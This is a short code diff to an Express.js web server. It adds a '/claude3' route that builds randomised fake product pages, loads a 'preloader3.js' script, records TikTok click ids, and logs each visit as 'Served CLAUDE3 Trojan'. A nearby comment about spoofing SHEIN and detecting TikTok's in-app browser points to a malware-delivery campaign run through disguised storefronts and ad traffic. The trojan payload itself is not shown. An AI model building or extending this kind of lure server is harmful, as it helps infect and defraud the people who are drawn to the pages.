@@ -2908,7 +2908,23 @@ app.get('/claude2', extractSubdomain, (req, res, next) => {
     res.send(html);
 });
 
-
+// LULU
+app.get('/claude3', extractSubdomain, (req, res, next) => {
+    const slug = req.subdomain;
+    const hash = generateHash(slug);
+    const preloader = "preloader3.js";
+    let ttclid = req.query.ttclid || 'Not specified';
+    if (ttclid !== 'Not specified') {
+        ttclid = ttclid.slice(0, 5);
+    }
+    console.log(`Served CLAUDE3 Trojan (${slug})::(${ttclid})`);
+    const layout = selectFromArray(layouts, parseInt(hash.substr(0, 8), 16));
+    const product = selectFromArray(products, parseInt(hash.substr(8, 8), 16));
+    const banner = selectFromArray(banners, parseInt(hash.substr(16, 8), 16));
+    const backgroundColor = generateColor(hash);
+    const html = layout.generateHTML(slug, product, banner, backgroundColor, hash, preloader);
+    res.send(html);
+});
 
 // SHEIN V4 SUB METHOD
 //         const isTok = /musical_ly|Bytedance|BytedanceWebview|ByteLocale/i.test(navigator.userAgent); && !isTok
